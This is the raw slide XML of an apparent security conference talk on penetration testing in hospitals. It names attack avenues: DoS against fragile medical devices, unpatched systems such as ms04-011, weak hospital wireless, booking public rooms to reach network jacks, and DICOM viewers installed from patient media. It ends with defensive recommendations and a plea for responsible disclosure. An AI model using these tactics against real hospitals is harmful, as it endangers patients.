            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Lack of operation can be just as detrimental patient care</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Just fire off a platform specific </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>DoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> or exhaust the resources of an embedded device at the wrong moment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>HVAC. Heat kills in a hospital.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Fancy targeted attacks appear possible on some devices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>We all probably have hospitalized loved ones. Please disclose responsibly.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>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4365104"/>
            <a:ext cx="9144000" cy="2492896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F6F1DE"/>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solidFill>
                <a:srgbClr val="F1F0DB"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill flip="none" rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:schemeClr val="tx1">
                  <a:lumMod val="95000"/>
                  <a:lumOff val="5000"/>
                </a:schemeClr>
              </a:gs>
              <a:gs pos="100000">
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:gs>
            </a:gsLst>
            <a:path path="circle">
              <a:fillToRect r="100000" b="100000"/>
            </a:path>
            <a:tileRect l="-100000" t="-100000"/>
          </a:gra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5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="180256"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>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8" name="Titre 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472008" y="1124744"/>
            <a:ext cx="7772400" cy="1512168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t" anchorCtr="0">
            <a:noAutofit/>
            <a:scene3d>
              <a:camera prst="orthographicFront"/>
              <a:lightRig rig="soft" dir="t">
                <a:rot lat="0" lon="0" rev="10800000"/>
              </a:lightRig>
            </a:scene3d>
            <a:sp3d>
              <a:bevelT w="27940" h="12700"/>
              <a:contourClr>
                <a:srgbClr val="DDDDDD"/>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800" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>That’s bad…</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8800" cap="all" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Titre 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="2276872"/>
            <a:ext cx="7772400" cy="936104"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t" anchorCtr="0">
            <a:noAutofit/>
            <a:scene3d>
              <a:camera prst="orthographicFront"/>
              <a:lightRig rig="soft" dir="t">
                <a:rot lat="0" lon="0" rev="10800000"/>
              </a:lightRig>
            </a:scene3d>
            <a:sp3d>
              <a:bevelT w="27940" h="12700"/>
              <a:contourClr>
                <a:srgbClr val="DDDDDD"/>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6800" b="1" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>So now what?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="6800" cap="all" dirty="0">
              <a:solidFill>
                <a:srgbClr val="82B400"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="5134880"/>
            <a:ext cx="9144000" cy="886408"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr"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3188948868"/>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misc</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healthcare</a:t>
            </a:r>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pen</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notes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Embedded medical devices are exceedingly fragile and can directly affect patient care; be careful with scans.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Time to log in to a given system is of upmost importance to clinical staff. This can result in lax authentication schemes or poorly implemented SSO solutions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Most healthcare systems rely heavily on common remote access technologies to provide access to legacy win32 applications both internally and externally.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>FDA approval leads to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>unpatched</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> boxes (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> herd u like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0"/>
              <a:t>ms08-067</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>, ms04-011)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>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smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>misc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0"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healthcare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>pen</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0"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notes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Wireless will likely be required to support insecure configurations due to medical devices (WEP, LEAP, no cert validation – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>FreeRadious</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>-WPE)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Walking around with antennas hanging off your laptop will probably only get you passing glances.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>You should be able to find an unlocked computer or exposed network jack. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>Public meeting rooms. Call ahead and book one for a community event.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>Public computer labs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>It is regular practice in most environments for nurses and doctors to install DICOM related image viewers directly from patient provided medium due to lack of compatibility.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>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Summary</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0" err="1" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0" err="1" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>folly</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Healthcare is exceedingly difficult to secure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>Vertical is at least 10 years behind the times</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Other industries that rely on embedded systems (term used loosely) will have similar challenges</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>Healthcare just has a very high population of critical embedded systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Hospitals are essentially public places.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>Physically accessible</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>Virtually accessible</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Regulation seems to hinder more than help</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>Adoption of EMR/HIE before maturity due to federal mandates</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>FDA certification of devices</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>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800" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Solutions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Patients should not volunteer their data into opt-in services</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Healthcare professionals should leverage buying power</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>Formalize technology selection criteria</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>Actually involve IT/IS in product selection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Air-gapped networks used to be normal for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>BioMed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>. Go back to the gap.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>IT/IS should follow best practices.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>Do not use medical specific technologies when defensible off the shelf options exist</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Healthcare manufacturers should join the century</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>Make it easy to report bugs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>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4365104"/>
            <a:ext cx="9144000" cy="2492896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F6F1DE"/>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solidFill>
                <a:srgbClr val="F1F0DB"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill flip="none" rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:schemeClr val="tx1">
                  <a:lumMod val="95000"/>
                  <a:lumOff val="5000"/>
                </a:schemeClr>
              </a:gs>
              <a:gs pos="100000">
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:gs>
            </a:gsLst>
            <a:path path="circle">
              <a:fillToRect r="100000" b="100000"/>
            </a:path>
            <a:tileRect l="-100000" t="-100000"/>
          </a:gra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5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="180256"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>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8" name="Titre 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472008" y="1124744"/>
            <a:ext cx="7772400" cy="1512168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t" anchorCtr="0">
            <a:noAutofit/>
            <a:scene3d>
              <a:camera prst="orthographicFront"/>
              <a:lightRig rig="soft" dir="t">
                <a:rot lat="0" lon="0" rev="10800000"/>
              </a:lightRig>
            </a:scene3d>
            <a:sp3d>
              <a:bevelT w="27940" h="12700"/>
              <a:contourClr>
                <a:srgbClr val="DDDDDD"/>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800" cap="all" dirty="0" err="1" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Q&amp;a</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8800" cap="all" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="5134880"/>
            <a:ext cx="9144000" cy="886408"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr"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3" name="Sous-titre 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="560866" y="2564904"/>
            <a:ext cx="5451294" cy="1512168"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tim Elrod: tim.elrod@fishnetsecurity.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Stefan Morris: h0rktik@h0rk.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="1800" i="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="3188948868"/>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4365104"/>
            <a:ext cx="9144000" cy="2492896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F6F1DE"/>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fr-CA">
              <a:solidFill>
                <a:srgbClr val="F1F0DB"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill flip="none" rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:schemeClr val="tx1">
                  <a:lumMod val="95000"/>
                  <a:lumOff val="5000"/>
                </a:schemeClr>
              </a:gs>
              <a:gs pos="100000">
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:gs>
            </a:gsLst>
            <a:path path="circle">
              <a:fillToRect r="100000" b="100000"/>
            </a:path>
            <a:tileRect l="-100000" t="-100000"/>
          </a:gra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fr-CA"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="180256"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>
          </a:solidFill>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fr-CA"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Titre 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472008" y="1124744"/>
            <a:ext cx="7772400" cy="1512168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t" anchorCtr="0">
            <a:noAutofit/>
            <a:scene3d>
              <a:camera prst="orthographicFront"/>
              <a:lightRig rig="soft" dir="t">
                <a:rot lat="0" lon="0" rev="10800000"/>
              </a:lightRig>
            </a:scene3d>
            <a:sp3d>
              <a:bevelT w="27940" h="12700"/>
              <a:contourClr>
                <a:srgbClr val="DDDDDD"/>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CA" sz="8800" cap="all" dirty="0" err="1" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Thank</a:t>
            </a:r>
            <a:endParaRPr lang="fr-CA" sz="8800" cap="all" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Titre 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
